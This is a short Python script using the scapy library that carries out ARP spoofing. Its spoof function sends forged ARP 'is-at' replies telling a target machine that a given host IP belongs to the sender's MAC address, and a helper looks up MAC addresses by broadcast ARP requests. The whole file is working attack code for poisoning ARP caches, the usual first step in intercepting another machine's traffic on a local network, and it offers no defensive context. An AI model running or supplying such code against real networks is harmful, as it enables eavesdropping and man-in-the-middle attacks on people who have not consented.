from scapy.all import send
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp


def spoof(target_ip, host_ip):
    # This function sends out ARP responses (spoofs) with your MAC address
    target_mac = get_mac_address(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)


def get_mac_address(ip_address):
    # This function uses ARP to get the MAC address of a specific IP
    # this will return the source of IP i.e. MAC address
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2)
    for send, receive in ans:
        return receive[Ether].src
    return None
